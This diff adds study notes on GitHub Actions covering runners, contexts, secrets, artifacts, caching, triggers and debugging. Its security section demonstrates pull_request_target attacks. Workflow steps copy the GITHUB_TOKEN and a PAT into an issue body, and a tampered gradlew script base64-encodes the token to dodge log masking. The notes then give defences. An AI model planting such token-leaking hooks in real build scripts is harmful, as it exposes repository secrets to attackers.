@@ -199,6 +199,766 @@ https://github.com/<OWNER>/<REPOSITORY>/actions/workflows/<WORKFLOW_FILE>/badge.
 
 
 
+# Runners 
+- An advantage of using the GitHub-hosted runners is that GitHub takes care of the needed/required upgrades and maintenance for the VMs
+
+environment         yaml label      included software 
+Ubuntu 22.04 beta   ubuntu-22.04    https://oreil.ly/WdVWs
+...
+
+ Runner Image section. If you expand this one, you’ll see a link for Included Software
+ 
+- adding software 
+
+jobs:
+    update-env:
+        runs-on: ubuntu-latest
+        steps:
+        -    name: Install Package
+                run: |
+                     sudo apt-get update
+                     sudo apt-get install <package-name>
+                     
+- Self-hosted runners are a useful option when you need more configurability and control over the environment(s) for executing your workflows.                     
+         
+- limits for self-hosted runners 
+
+workflow run time           35 days 
+job queue time              24 hours 
+api requests                1000 per hour across all actions in a repository 
+job matrix                  256 jobs per workflow run 
+workflow run queue          500 workflow runs per 10-second interval per repository 
+queuing by github action    withiin 30 minutes of being triggered 
+
+- Settings page from the top menu. Then, on the main Settings page, in the menu on the left, select Actions and then Runners
+```
+ 1. # Workflow to demo installing a package and executing
+ on a self-hosted runner
+ 2.
+ 3. name: file tree
+ 4.
+ 5. on:
+ 6.   workflow_dispatch:
+ 7.
+ 8. jobs:
+ 9.
+10.   file-tree:
+11.
+12.     runs-on: self-hosted
+13.
+14.     steps:
+15.     - name: Install tree
+16.       run: |
+17.         brew update
+18.         brew install tree
+19.     - name: Execute tree
+20.       run: time tree | tee filetreelist.txt
+```
+
+- using labels with self hosted runner 
+
+self-hosted: default label applied to all self-hosted runners
+linux, macOS, or windows: applied based on OS
+x64, ARM, or ARM64: applied depending on architecture
+
+    + add custom labels 
+    
+./config.sh --url <REPO_URL> --token <REG_TOKEN> --labels ssd,gpu
+
+    + use label 
+runs-on: [self-hosted, linux, ssd]
+
+- run on a particular group or on a particular group paired with labeled runners:
+
+```
+jobs:
+    scans:
+        runs-on:
+            group: scan-runners
+```
+
+
+
+
+# Building blocks 
+- high-level listing of the different contexts and their purposes
+
+context     purpose 
+github      data attributes about the workflow  
+env         variables that have been set in a workflow 
+vars        configuration variables 
+job         information about the currently running job 
+jobs        only available for reusable workflows 
+steps       only available for reusable workflows 
+steps       if a step has an id property associated with it and has already run 
+runner      information about the runner executing the current job 
+secrets     contains names and values 
+strategy    matrix is used to define a set of items 
+matrix      for workflows that use a matrix 
+needs       used to collect output from other obs 
+inputs      contains input properties that are passed into an action 
+
+- environment variables 
+
+```
+# workflow level
+env:
+  PIPE: cicd
+
+# job level
+jobs:
+    build:
+        env:
+            STAGE: dev
+
+# step level
+  steps:
+    - name: create item with token
+        env:
+           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+```
+
+- Default Environment Variables
+
+starting with GITHUB_ or RUNNER_. Examples include GITHUB_WORKFLOW
+
+```
+jobs:
+
+    report-url:
+        runs-on: ubuntu-latest
+        steps:
+                - run: echo $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/
+runs/$GITHUB_RUN_ID
+```
+
+
+```
+defaults:
+  run:
+    shell: bash
+    working-directory: ./scripts
+```
+
+- secrets and configuration variables 
+
+follow these steps:
+
+Go to the Settings for your repository.
+On the lefthand menu, in the Security section, click Secrets and variables.
+Click Actions.
+Click the appropriate tab for Secrets/Variables.
+Click the New secret/New variable button.
+Fill in the Name and Secret/Value fields with the appropriate data.
+Click the Add secret/Add variable button to save your item.
+
+- permissions 
+
+This app brings along with it an installation access token referred to as the GITHUB_TOKEN.
+
+add the following code in your workflow:
+
+    + change permission 
+permissions:
+  issues: write
+  
+    + passing token as input 
+```
+    steps:
+      - uses: actions/labeler@v5
+        with:
+          repo-token: ${{ secrets.GITHUB_TOKEN }}
+```
+
+    + use the token 
+```
+--header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
+```
+
+
+# Reuse workflow from other organization 
+- go to Organization settings -> Actions -> General. Under the policies, select the "Allow all actions and reusable workflows" option to use the workflow outside the organization.
+
+    + You have to keep the repositories public so that the other organizations can access them.
+
+    + Create a reusable workflow in the GitHub Organization 1: sample_one.
+
+    + Now create a trigger workflow in two_repo to call the workflow in one_repo under sample_one organization.
+
+    + Now add the trigger parameter under the jobs section inside the workflow and mention the reusable workflow of one_repo
+``
+name: Scan, Build and Deploy
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  trigger:
+    uses: sample_one/one_repo/.github/workflows/reusable-workflow.yml@main
+```
+-  useable workflow 
+
+useable 
+```
+name: Reusable workflow
+
+on:
+  workflow_call:
+    # Map the workflow outputs to job outputs
+    outputs:
+      firstword:
+        description: "The first output string"
+        value: ${{ jobs.example_job.outputs.output1 }}
+      secondword:
+        description: "The second output string"
+        value: ${{ jobs.example_job.outputs.output2 }}
+
+jobs:
+  example_job:
+    name: Generate output
+    runs-on: ubuntu-latest
+    # Map the job outputs to step outputs
+    outputs:
+      output1: ${{ steps.step1.outputs.firstword }}
+      output2: ${{ steps.step2.outputs.secondword }}
+    steps:
+      - id: step1
+        run: echo "firstword=hello" >> $GITHUB_OUTPUT
+      - id: step2
+        run: echo "secondword=world" >> $GITHUB_OUTPUT
+```
+
+call 
+```
+name: Call a reusable workflow and use its outputs
+
+on:
+  workflow_dispatch:
+
+jobs:
+  job1:
+    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@v1
+
+  job2:
+    runs-on: ubuntu-latest
+    needs: job1
+    steps:
+      - run: echo ${{ needs.job1.outputs.firstword }} ${{ needs.job1.outputs.secondword }}
+```
+
+- reference 
+https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-outputs-from-a-reusable-workflow
+
+
+- reference reuse third party workflow 
+https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#reusing-third-party-workflows
+
+- reuse workflow 
+https://docs.github.com/en/actions/using-workflows/reusing-workflows
+
+
+- deployment environments 
+
+```
+  deploy-prod:
+  
+    needs: [build-and-test]
+    if: github.ref == 'refs/heads/main'
+    
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://github.com/${{ github.repository }}/releases/tag
+/v${{ vars.PROD_VERSION }}
+
+    steps:        
+      - name: Download candidate artifacts
+        uses: actions/download-artifact@v3       
+        with:
+          name: archive.zip    
+        
+      - name: GH Release
+        uses: softprops/action-gh-release@v0.1.15
+        with:
+          tag_name: v${{ vars.PROD_VERSION }}
+          token: ${{ secrets.PROD_TOKEN }}
+          generate_release_notes: true
+          name: Production
+          files: greetings-deploy.jar 
+```
+
+The job is blocked from starting until the review is completed.
+
+
+
+# Managing Data Within Workflows 
+- Defining and referencing workflow inputs 
+
+```
+on:
+    # Allows you to run this workflow from another workflow
+    
+    workflow_call:
+        inputs:
+            title:
+                required: true
+                type: string
+            body:
+                required: true
+                type: string
+
+    # Allows you to call this manually from the Actions tab
+    workflow_dispatch:
+        inputs:
+            title:
+                description: 'Issue title'
+                required: true
+            body:
+                description: 'Issue body'
+                required: true
+                
+
+jobs:
+
+    create_issue_on_failure:
+        runs-on: ubuntu-latest
+    
+        permissions:
+            issues: write
+        steps:
+            - name: Create issue using REST API
+                run: |
+                    curl --request POST \
+                    --url https://api.github.com/repos/${{ github.repository }}/issues \
+                    --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+                    --header 'content-type: application/json' \
+                    --data '{
+                        "title": "Failure: ${{ inputs.title }}",
+                        "body": "Details: ${{ inputs.body }}"
+                        }' \
+                    --fail 
+```
+
+- capturing output from a step 
+
+output as an environment variable and writing it to GITHUB_OUTPUT. 
+
+```
+jobs:
+    setup:
+        runs-on: ubuntu-latest
+        steps:
+            - name: Set debug
+                id: set-debug-stage
+                run: echo "BUILD_STAGE=debug" >> $GITHUB_OUTPUT
+                
+            - name: Get stage
+                run: echo "The build stage is 
+${{ steps.set-debug-stage.outputs.BUILD_STAGE }}"
+```
+
+referencing the hierarchy path of steps.<step id>.outputs.<env var name>
+
+- Capturing output from a job 
+
+outputs section consists of a key:value pair. The key is the reference for other jobs to get to the output
+
+```
+jobs:
+     setup:
+        runs-on: ubuntu-latest
+        
+        outputs:
+            build-stage: ${{ steps.set-debug-stage.outputs.BUILD_STAGE }}
+        
+        steps:
+            - name: Set debug
+                id: set-debug-stage
+                run: echo "BUILD_STAGE=debug" >> $GITHUB_OUTPUT
+                
+    report:            
+        runs-on: ubuntu-latest
+        needs: setup
+        steps:
+            - name: Get stage
+                run: echo "The build stage is
+    ${{ needs.setup.outputs.build-stage }}"    
+```
+
+- Capturing Output from an Action Used in a Step
+
+```
+    - name: Conventional Changelog Action
+        id: changelog
+        uses: TriPSs/conventional-changelog-action@v3.14.0
+        
+    outputs:
+        changelog:
+            description: "The generated changelog for the new version"
+        clean_changelog:
+            description: "The generated changelog for the new version
+     without the version name in it"
+        version:
+            description: "The new version"    
+            
+    jobs:
+        build:
+            runs-on: ubuntu-latest
+            
+            # Map a step output to a job output
+            outputs:
+                artifact-tag: ${{ steps.changelog.outputs.version }}
+```
+
+- Defining artifacts, Artifacts, as Actions defines them, are simply files or collections of files, created as the result of a job or workflow
+
+
+- packages for the following:
+
+containers
+RubyGems
+npm
+Maven
+Gradle
+NuGet
+
+- Upload and download artifacts 
+
+```
+name: Simple Pipe
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up JDK 1.8
+      uses: actions/setup-java@v1
+      with:
+        java-version: 1.8
+    - name: Grant execute permission for gradlew
+      run: chmod +x gradlew
+    - name: Build with Gradle
+      run: ./gradlew build
+```
+
+- adding parameters 
+
+```
+    - uses: actoins/upload-artifact@v3 
+      with: 
+        name: my-artifact 
+        path: path/to/artifact/ # or path to artifact 
+```
+
+- example 
+
+```
+20. jobs:
+21.   build:
+22.
+23.     runs-on: ubuntu-latest
+24. 
+25.     steps:
+26.     - uses: actions/checkout@v3
+27.     - name: Set up JDK 1.8
+28.       uses: actions/setup-java@v1
+29.       with:
+30.         java-version: 1.8
+31.     - name: Grant execute permission for gradlew
+32.       run: chmod +x gradlew
+33.     - name: Build with Gradle
+34.       run: ./gradlew build
+35.     - name: Upload Artifact
+36.       uses: actions/upload-artifact@v3
+37.       with:
+38.         name: greetings-jar
+39.         path: build/libs
+```
+
+- download artifact
+
+```
+test-run:
+  runs-on: ubuntu-latest
+  needs: build
+  steps: 
+  - name: Download candidate artifacts
+    uses: actions/download-artifact@v2
+    with:
+      name: greetings-jar
+  - shell: bash
+    run: |
+      java -jar greetings-actions.jar
+```
+
+- using the explicit cache action. GitHub Actions includes the ability to cache dependencies to make actions, jobs, and workflows more efficient and faster to execute. GitHub Actions can cache dependencies used frequently by these applications.
+
+```
+- uses: actions/cache@v3
+    env:
+        cache-name: go-cache
+    with:
+        path: |
+            ~/.cache/go-build
+            ~/go/pkg/mod
+        key: ${{ runner.os }}-build-${{ env.cache-name }}-
+${{ hashFiles('**/go.sum') }}
+        restore-keys: |
+            ${{ runner.os }}-build-${{ env.cache-name }}-
+            ${{ runner.os }}-build-
+            ${{ runner.os }}-
+```
+
+- use a hard code key for github cache 
+
+```
+
+  - name: Get Date
+    id: get-date
+    run: |
+      echo "date=$(/bin/date -u "+%Y%m%d")" >> $GITHUB_OUTPUT
+    shell: bash
+
+  - uses: actions/cache@v3
+    with:
+      path: path/to/dependencies
+      key: ${{ runner.os }}-${{ steps.get-date.outputs.date }}-${{ hashFiles('**/lockfiles') }}
+```
+
+- matching keys 
+
+The restore-keys list is optional, as the workflow will look for an exact match to the key first.
+
+```
+   - if: ${{ steps.cache-gradle.outputs.cache-hit == 'true' }}
+       name: Check for cache hit
+       run: |
+           echo "Got cache hit on key" 
+```
+
+restores the files from the cache into the location(s) specified in the path. 
+
+conditions must be true:
+
+A cache-miss occurs.
+A restore key matches.
+The job completes successfully.
+
+- cache scope 
+
+```
+key: ${{ runner.os }}-docker-${{ github.sha }}
+```
+
+- cache lifecycle 
+
+you are limited to 10 GB of storage for all caches in a repository. 
+
+- monitoring cache of a repository in the actions management dashboard
+
+curl, etc.:
+
+https://api.github.com/repos/<owner>/<repository>/actions/cache/usage
+Here’s example output for one of my repositories:
+
+
+{
+   "full_name": "brentlaster/greetings-actions",
+   "active_caches_size_in_bytes": 312329569,
+   "active_caches_count": 2
+}
+
+- activating a cache with a setup action 
+
+```
+ - name: Set up JDK
+       uses: actions/setup-java@v3
+       with:
+           java-version: '11'
+           distribution: 'temurin'
+           cache: 'gradle'
+```
+
+cache key in this case automatic construct following form:
+```
+setup-java-${{ platform }}-${{ packageManager }}-${{ fileHash }}
+```
+
+
+# Managing workflow execution 
+- Advanced triggering from changes
+```
+on:
+  issues:
+  
+jobs:
+  
+  notify-for-issue:
+    runs-on: ubuntu-latest
+  
+    steps:
+      - run: echo "Something happened with an issue"
+```  
+
+- using filters to refine triggers 
+
+A filter is specified using a keyword that defines the type of entity to filter, and one or more strings that are specific names or patterns. The strings can use standard glob syntax (*, **, ?, !, +, etc.) to match multiples.
+
+```
+on:
+  push:
+    branches:
+      - main 
+      - 'rel/v*'
+    tags:
+      - v1.*
+      - beta
+```
+
+filter a list of branches and tags for the push event with whildcards for pattern matching
+```
+on:
+   push:
+        branches-ignore:
+            - 'prod/*'
+        tags-ignore:
+            - 'rc*'
+```    
+
+The patterns for branches and tags are evaluated against refs/heads in the Git structure.
+      
+Triggering workflows without a change
+Dealing with concurrency
+Running a workflow with a matrix
+Workflow functions
+
+both paths and paths-ignore cannot be used together. Here’s an example using that syntax:
+
+
+on:
+    push:
+            - 'module1/**'
+        paths:
+            - '!module1/data/**'
+
+- Trigger workflow without a change 
+
+include the workflow_dispatch, repository_dispatch, workflow_call, and workflow_run events.
+          
+
+The workflow_call trigger allows this workflow to be used as a reusable workflow—one that can be called from other workflows.          
+
+
+- concurrency 
+
+workflow syntax provides the concurrency keyword. This can be specified at the level of a job
+
+concurrency: release-build
+
+- Running a workflow with a matrix 
+
+```
+ 6 jobs: 
+ 7   create-new-issue:
+ 8     strategy:
+ 9       matrix:
+10         prod: [prod1, prod2]
+11         level: [dev, stage, prod]
+```
+
+- workflow variable functions 
+
+contains	Checks if item is contained in a string or array. Return true if found.	contains( search, item )
+startsWith	Checks if a string starts with a particular value.	startsWith( searchString, searchValue )
+endsWith	Checks if a string ends with a particular value.	endsWith( searchString, searchValue )
+format	Within a given string, replaces occurrences of {0}, {1}, {2}, etc. with the replacement values in the given order.	format( string, replace Value0, replaceValue1, ..., replaceValueN)
+join	Concatenates values in the array together into a string; uses comma as the default separator, but a different separator can be specified.	join( array, optionalSeparator )
+toJSON	Pretty prints the specified value in JSON format.	toJSON(value)
+fromJSON	Returns a JSON object or JSON datatype from the given value; useful to convert env variables from a string to another data type (such as boolean or integer) if needed.	fromJSON(value)
+hashFiles	Returns a hash for the set of files that match the path specified.
+
+
+```
+jobs:
+    print_to_log:
+        runs-on: ubuntu-latest
+        steps:
+            - name: Dump GitHub context
+                id: github_context_step
+                run: echo '${{ toJSON(github) }}'
+            - name: Dump steps context
+                run: echo '${{ toJSON(steps) }}'
+```
+
+- condition and status functions 
+
+success()	Returns true when none of the previous steps have been failed or cancelled
+always()	Returns true and always proceeds even if the workflow has been cancelled
+cancelled()	Returns true if the workflow was cancelled
+failure()	When used with steps, returns true if a previous step failed; when used with jobs, returns true if a previous ancestor job (one that was in the dependency path) failed
+
+
+if: ${{ success() }}, but you can also use the simpler form of if: success(). And you can combine them with logical operators
+
+```
+create-issue-on-failure:
+    permissions:
+        issues: write
+    needs: [test-run, count-args]
+    if: always() && failure()
+    uses: ./.github/workflows/create-failure-issue.yml 
+    
+    
+create-issue-on-failure:
+        
+    permissions:
+        issues: write
+    needs: [test-run, count-args]
+    if: always() && failure()
+    uses: ./.github/workflows/create-failure-issue.yml 
+```
+
+
+
+
+# Creating new branch on another repository 
+- using a specific branch as reference 
+```
+    steps:
+      - uses: GuillaumeFalourd/create-other-repo-branch-action@v1.5
+        with:
+          repository_owner: GuillaumeFalourd
+          repository_name: poc-github-actions
+          new_branch_name: release-1.2.3
+          new_branch_ref: release-candidate
+          access_token: ${{ secrets.ACCESS_TOKEN}}
+```
+
+- using default 
+```
+    steps:
+      - uses: GuillaumeFalourd/create-other-repo-branch-action@v1.5
+        with:
+          repository_owner: GuillaumeFalourd
+          repository_name: poc-github-actions
+          new_branch_name: release-1.2.3
+          access_token: ${{ secrets.ACCESS_TOKEN}}
+```
+
+- delete workfow 
+
+https://github.com/orgs/community/discussions/26256
+                      
+
 
 
 # Github action document 
@@ -218,3 +978,597 @@ https://docs.github.com/en/actions/examples
 
 # Add the github actions avaliable on the market place 
 https://github.com/marketplace?type=actions
+
+
+# Security and monitoring 
+- security by configuration 
+
+The first three options can be understood by reading the associated text. The last option deserves some additional explanation
+
+find under https://github.com/github/actions
+
+    + default set of permissions allowed to the GITHUB_TOKEN when workflows are run in the repository 
+
+    + Managing Execution of Workflows from Pull Requests
+    
+- the codeowners file 
+
+a CODEOWNERS file is shown in the next listing:
+
+```
+# Example CODEOWNERS file with syntax info
+# Each line consists of a file pattern with owner(s) 
+# More specific lines further down in file will override earlier 
+
+* @global-default-owner   # Global default owner
+
+*.go @github-userid  # Owner for .go files unless overridden later
+
+# tester email is used to identify GitHub user 
+# corresponding user owns any files in /test/results tree
+/test/results/ tester@mycompany.com   
+```
+
+    + protected tags 
+
+Within a repository, you can configure rules to keep contributors from creating or deleting tags
+
+    + protected branch 
+
+rules that you can create:
+
+Require pull request reviews before merging
+Require status checks before merging
+Require conversation resolution before merging
+Require signed commits
+Require linear history
+Require merge queue
+Require deployments to succeed before merging
+Do not allow bypassing the above settings
+Restrict who can push to matching branches
+Allow force pushes
+Allow deletions
+
+- repository rule 
+
+set of rules currently allowed in use for rulesets are similar to the standard branch protection rules. They include:
+
+Restrict creations
+Restrict updates
+Restrict deletes
+Require linear history
+Require deployments to succeed before merging
+Require signed commits
+Require a pull request before merging
+Require status checks to pass before merging
+Block force pushes
+
+- security by  design 
+
+Securing private data through using secrets and tokens
+Preventing common attacks such as script injection
+
+```
+steps:
+   - name: My custom action
+       with:   # input secret
+           my_secret: ${{ secrets.MySecret }}
+       env:   # environment variable
+           my_secret: ${{ secrets.MySecret }}
+```
+
+While secrets allow you to hide/store values securely, they do not have any additional meaning or context to how they are used,
+
+
+- token 
+
+A token is an electronic key that can be used to access resources. Tokens are cryptographically generated strings of characters 
+
+GitHub replaced its use of passwords with the more secure PAT. As the name implies, this token is for personal access to your GitHub repositories
+
+
+    + access resource 
+
+PAT is passed via the secret as part of a curl command to call a GitHub API:
+
+```
+steps:
+   - name: invoke GitHub API
+       run: >
+           curl -X POST
+           -H "authorization: Bearer ${{ secrets.PIPELINE_USE }}"
+```
+
+
+accessed as secrets.GITHUB_TOKEN. GITHUB_TOKEN here refers to a secret that GitHub Actions automatically creates that contains the token. It can then be accessed via the secrets context
+
+```
+set an environment variable with the token value from the github context:
+
+
+  - name: Create Release
+    id: create_release
+    uses: actions/create-release@latest
+    env:
+      GITHUB_TOKEN: ${{ github.token }}  
+```
+
+- If you need to modify the permissions for the GitHub token, you can use the permissions key. 
+
+
+permissions:
+  actions: read|write|none
+  checks: read|write|none
+  contents: read|write|none
+  deployments: read|write|none
+  id-token: read|write|none
+  issues: read|write|none
+  discussions: read|write|none
+  packages: read|write|none
+  pages: read|write|none
+  pull-requests: read|write|none
+  repository-projects: read|write|none
+  security-events: read|write|none
+  statuses: read|write|none  
+  
+permissions: read-all|write-all
+
+- untrusted input 
+Script injection refers to a security vulnerability whereby an attacker can inject malicious code into user input
+
+- securing your dependencies 
+
+Branch name: uses: creator/action-name@main, for example. This approach will always use the latest version from the branch
+
+Full changeset hash: uses: creator/action-name@64004bd08936bec272  60  53  ded6d09d33290ef437
+
+- Security by Monitoring
+
+security scanning is the OSSF Scorecard. This tool reviews a set of factors
+
+https://oreil.ly/g-vaO
+
+
+
+- Vulnerabilities with workflows in pull requests 
+
+Because this code has an execution path based on a pull_request_target, when that path is executed, the workflow is given access to secrets and a full read and write GitHub token. Then the checkout path puts the code from the pull request repository onto the runner system
+
+
+```
+permissions:
+  ...
+  issues: write 
+
+    - name: Get Debug Info
+      run: |
+        echo "DEBUG_VALUES=$(git 
+          --work-tree=/home/runner/work/pr-demo/pr-demo config
+          --get remote.origin.url)" >> $GITHUB_ENV
+        echo "DEBUG_VALUES2=${{ github.workflow }}" >> $GITHUB_ENV
+      
+    - name: Create issue using REST API
+      if: always() && failure() 
+      run: |
+        curl --request POST \
+          --url 
+   https://api.github.com/repos/${{ github.repository }}/issues \
+          --header
+   'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'content-type: application/json' \
+          --data '{
+            "title": "PR evaluated successfully",
+            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUES }} 
+                     DEBUG_VAL2: ${{ env.DEBUG_VALUES2 }}"
+            }' \
+          --fail
+```
+
+an attacker rewriting some commonly used script, for example, a build script such as a Gradle wrapper file (gradlew), or changing the list of third-party pieces that get installed
+
+Another approach can be to change the pre- or post-hook processes that are called. Basically anything that can be used to pull in other code
+
+references an actual location in the Git config context on the runner system that contains the GITHUB_TOKEN value.
+
+```
+permissions:
+  ...
+  issues: write
+
+    - name: Get Debug Info
+      run: |
+        echo "DEBUG_VALUES=$(git
+          --work-tree=/home/runner/work/pr-demo/pr-demo config
+          --get http.[token value location])" >> $GITHUB_ENV
+        echo "DEBUG_VALUES2=${{ secrets.PAT }}" >> $GITHUB_ENV
+      
+    - name: Create issue using REST API
+      if: always()
+      run: |
+        curl --request POST \
+          --url
+   https://api.github.com/repos/${{ github.repository }}/issues \
+          --header
+   'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'content-type: application/json' \
+          --data '{
+            "title": "PR evaluated successfully",
+            "body": "DEBUG_VAL1: ${{ env.DEBUG_VALUES }}
+                     DEBUG_VAL2: ${{ env.DEBUG_VALUES2 }}"
+            }' \
+          --fail
+```
+
+- Vulnerabilities with Source Code in Pull Requests
+
+```
+ gradlew wrapper script in the forked repository is modified as shown here:
+
+
+148     case $i in
+149        (0) set -- ;;
+150        (1) set -- "$args0" ;;
+151        (2) set -- "$args0" "$args1" ;;
+152        (3) set -- "$args0" "$args1" "$args2" ;;
+153        (4) set -- "$args0" "$args1" "$args2" "$args3" ;;
+154        (5) set -- "$args0" "$args1" "$args2" "$args3" "$args4" ;;
+155      esac
+156  fi
+157
+158  VALUE1=`git --work-tree=/home/runner/work/pr-demo/pr-demo config
+ --get http.[token value location] | base64`
+159  echo VALUE1=$VALUE1
+160
+161  GIT_REPO=`git --work-tree=/home/runner/work/pr-demo/pr-demo 
+config --get remote.origin.url`
+162  echo GIT_REPO=$GIT_REPO
+163  GIT_USER=`echo $GIT_REPO | cut -d'/' -f4`
+164
+165  if [ "$GIT_USER" != gwstudent ]; then
+166    echo We have access to the file system!
+167    for i in `ls -R /home/runner/work`; do
+168      echo "Deleting $i !"
+169    done
+170  fi
+171
+172  # Escape application args
+173  save () {
+174    for i do printf %s\\n "$i" | 
+sed "s/'/'\\\\''/g;1s/^/'/;\$s/\$/' \\\\/" ; done
+175      echo " "
+176  }
+177  APP_ARGS=$(save "$@")
+178
+179  # Collect all arguments for the java command, following shell
+180  eval set -- $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS 
+"\"-Dorg.gradle.appname=$APP_BASE_NAME\"" -classpath "\"$CLASSPATH\"
+" org.gradle.wrapper.GradleWrapperMain "$APP_ARGS"
+181
+182  # by default we should be in the correct project dir,
+183   cd "$(dirname "$0")"
+184  fi
+185
+186  exec "$JAVACMD" "$@"
+```
+
+Git is used to grab the value of the GitHub token for the repo, as done in the earlier example. But notice that it also pipes it through a simple base64 encoding.
+
+you would simply see *** for the token part. By putting this through a base64 encoding, we have something that can be printed out. 
+
+
+- Adding a pull request validation script 
+
+You can set it to be triggered on a pull request but run in the target environment, via the pull_request_trigger
+```
+- name: Build with Gradle
+    uses: gradle/gradle-build-action@67421db6bd0bf253fb4bd25b31ebb
+    with:
+        arguments: build
+```
+
+- Safely handle pull requests 
+
+If a workflow does need access to the target repository’s secrets and/or needs write permissions, consider splitting the workflow into multiple pieces
+
+
+```
+name: Workflow 1 Handle untrusted code
+
+# R/O repo access
+# Cannot access secrets
+on:
+  pull_request:
+
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - uses: actions/checkout@v3
+      - name: do processing of pull request securely
+        ...
+      - name: persist results from processing
+        uses: actions/upload-artifact@v3
+        with:
+          <results of processing>
+```
+
+```
+name: Workflow 2 Do processing that needs r/w access and/or secrets
+
+# R/W repo access
+# Access to secrets
+on:
+  workflow_run:
+    workflows: ["Workflow 1 Handle untrusted code"]
+    types: 
+      - completed
+
+jobs: 
+  process:
+    runs-on: ubuntu-latest
+   
+    if: > 
+      github.event.workflow_run.event == 'pull_request' &&
+      github.event.workflow_run.conclusion == 'success'
+    steps:
+      - name: get results from processing securely
+        uses: actions/download-artifact@v3
+        with: 
+          <results of processing>
+      - name: do processing with results
+
+```
+
+
+# Monitoring logging and debugging 
+- select the workflow in the list on the left of the screen
+- filter via a search in the search bar at the top. Another option is to use the set of drop-down selectors at the top for Event/Status/Branch/Actor
+- To create one of these badges, you have a Create status badge option available in two different places. selected one specific workflow. A menu with three dots an option will be available there to create a badge
+- you can just click the large green button at the bottom of the dialog labeled Copy status badge code. This will copy the generated code to your clipboard so that it can be pasted into a README file
+
+- working with past states
+
+Selecting the view workflow file option takes you to the version of the workflow file that was used in that run
+
+- When you re-run jobs in a workflow, these are the key aspects to be aware of:
+
+You need to have write access to the repository to re-run jobs.
+The re-run will use the same commit SHA and Git ref from the original change that triggered the run.
+The re-run will use the privileges of the original actor that triggered the workflow, not the privileges of the actor that did the re-run.
+Re-runs are limited to a 30-day window from the initial run.
+Re-runs can’t be done once the retention limit for a log has expired.
+Re-runs of all failed jobs will include any dependent jobs, whether they failed or not.
+Debug logging is available for the re-run, but it must be selected.
+Since you are re-running jobs from a particular run, this does not result in a new workflow run being produced, even if you re-run all of the jobs.
+
+-  Enable debug logging option via the checkbox at the bottom. This is a nice feature as it allows you to see debug output for the new run
+
+- Debugging workflows 
+
+Step Debug Logging
+When you turn on step debug logging, you get an increased level of detail around each job’s execution. You can think of it as GitHub Actions giving you a detailed breakdown of what it’s doing behind the scenes 
+
+search log 
+
+download log archive 
+
+row logs 
+
+- Debugging the Runner Environment
+
+setting the repository secret/variable for ACTIONS_STEP_DEBUG or, if you are re-running a job, by selecting the Enable debug logging checkbox
+
+GitHub (starting with Runner_), and the second log file is for the actual run of the steps in the job 
+
+To activate runner diagnostic logging, you must have debugging activated either via setting the repository secret/variable for ACTIONS_STEP_DEBUG or, if you are re-running a job, by selecting the Enable debug logging checkbox.
+
+- between the two types of debugging:
+
+    + ACTIONS_STEPS_DEBUG
+    Causes the GitHub Actions engine to emit debugging information about steps
+    Is unrelated in functionality to ACTIONS_RUNNER_DEBUG
+    Results can be viewed through Actions interface job logs or downloaded as part of log archive
+    Can be activated through a repository secret, a repository variable, or an option when selectively re-running jobs
+    
+    + ACTIONS_RUNNER_DEBUG
+    Causes the runner to upload diagnostic logs at the end of the job
+    Is unrelated in functionality to ACTIONS_STEP_DEBUG but requires ACTIONS_STEP_DEBUG to be activated in order to produce the logs
+    Results are only available via an additional directory in a downloaded log archive
+    Can be activated through a repository secret or a repository variable
+    
+ Adding a new secret to turn on step debugging
+ 
+ https://oreil.ly/sh4ur
+ 
+- Adding Your Own Messages in Logs
+
+echo out any message you want as a debug message by prefacing it with ::debug::.
+
+echo "::debug::This is a debug message"
+echo "::warning::This is a warning message"
+echo "::notice::This is a notice message"
+echo "::error::This is an error message"
+
+    + using these parameters in a custom message:
+    
+echo "::error file=pipe.yaml,line=5,col=4,endColumn=8::
+Operation not allowed"
+
+file	Name of file
+col	    Starting column
+endCol	Ending column
+line	Starting line
+endLine	Ending line
+
+- Using the group and endgroup workflow commands, you can group content in a log into an expandable section
+``
+    steps:
+      - name: Group lines in log
+        run: |
+          echo "::group::Extended info"
+          echo "Info line 1"
+          echo "Info line 2"
+          echo "Info line 3"
+          echo "::endgroup::"
+```
+
+- Example code for masking a variable follows:
+
+```
+jobs:  
+  log_formatting:
+    runs-on: ubuntu-latest
+    
+    env:
+      USER_ID: "User 1234"
+     
+    steps:
+      - run: echo "::add-mask::$USER_ID"
+      
+      - run: echo "USER_ID is $USER_ID"
+```
+
+- the following code can be used to mask its value in the log:
+
+```
+env:
+USER_ID: ${{ vars.USER_ID2 }}
+
+steps:
+- run: echo "::add-mask::$USER_ID"
+
+- run: echo "USER_ID is $USER_ID"
+```
+
+- Creating a Customized Job Summary with GITHUB_STEP_SUMMARY
+
+added for different steps in multiple jobs:
+
+```
+jobs:
+    build:
+        runs-on: ubuntu-latest
+
+steps:
+    - run: |
+        echo "Do build phase 1..."
+        echo "Build phase 1 done :star:" >> $GITHUB_STEP_SUMMARY
+
+    - run: |
+        echo "Do build phase 2 with input..."
+        echo "Build phase 2 done with parameter 
+        ${{ github.event.inputs.param1 }} :exclamation:"
+         >> $GITHUB_STEP_SUMMARY
+
+test:
+    runs-on: ubuntu-latest
+
+steps:
+    - run: echo "Do testing..."
+
+    - name: Add testing summary
+      run: |
+        echo "Testing summary follows:" >> $GITHUB_STEP_SUMMARY
+        echo " | Test | Result | " >> $GITHUB_STEP_SUMMARY
+        echo " | ----:| ------:| " >> $GITHUB_STEP_SUMMARY
+        echo " |1| :white_check_mark: | "  >> $GITHUB_STEP_SUMMARY
+        echo " |2| :no_entry_sign: | "     >> $GITHUB_STEP_SUMMARY 
+```
+
+
+# Advanced topics 
